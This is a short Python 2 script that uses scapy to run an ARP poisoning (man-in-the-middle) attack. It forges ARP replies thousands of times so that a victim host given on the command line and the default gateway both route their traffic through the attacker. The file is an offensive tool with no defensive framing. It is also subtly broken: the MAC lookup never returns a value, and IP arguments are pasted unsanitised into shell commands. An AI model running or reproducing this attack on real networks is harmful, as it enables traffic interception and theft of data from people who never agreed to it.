import os, sys,socket, struct,time
from scapy.all import *

#get the IP of the dafault GW
def get_default_gateway():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

#get the MAC from the IP ()
def get_MAC_from_IP(ip):
	# ping is optional (sends a WHO_HAS request)
	os.popen('ping -c 1 %s' % ip)

	# grep with a space at the end of IP address to make sure you get a single line
	fields = os.popen('grep "%s " /proc/net/arp' % ip).read().split()
	if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
		print str(fields)
		#return fields[3]
	else:
		print 'no response from', ip
		print str(fields)

		return None
		
#gets to IPs and returns 2 MACs		
def get_MAC_of_2_IPs(IP_1,IP_2):
	MAC_1,MAC_2=get_MAC_from_IP(IP_1),get_MAC_from_IP(IP_2)
	return (MAC_1,MAC_2)


def ARP_poisoning((routerIP,routerMAC),(victimIP,victimMAC)):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
		




def main():

	times=2100
	#get IP addresses
	IP_gateway=	get_default_gateway()
	IP_victim	=	sys.argv[1]
	
	
	#get MAC adresses
	(MAC_victim,MAC_GW)=get_MAC_of_2_IPs(IP_victim,IP_gateway)

	router	=	(IP_gateway,MAC_GW)	
	victim	=	(IP_victim,MAC_victim)
	
	print'=======================STRTING - sending for '+str(times)+' times========================='	

	for i in xrange(times):
		ARP_poisoning(router,victim)
		time.sleep(0.05)
		printval=str(i+1)
		printval+=str('\\')+str(times)		
		print '---------------------------['+printval+']---------------------------'
	print'=====================================DONE==================================================='	
	
	'''#tests
	print ('victim: MAC('+IP_victim+')\t= '+	str(MAC_victim))
	print ('gateWay:MAC('+IP_gateway+')\t= '+	str(MAC_GW))
	'''
	
	
	
	
	return 0

if __name__ == '__main__':
	main()

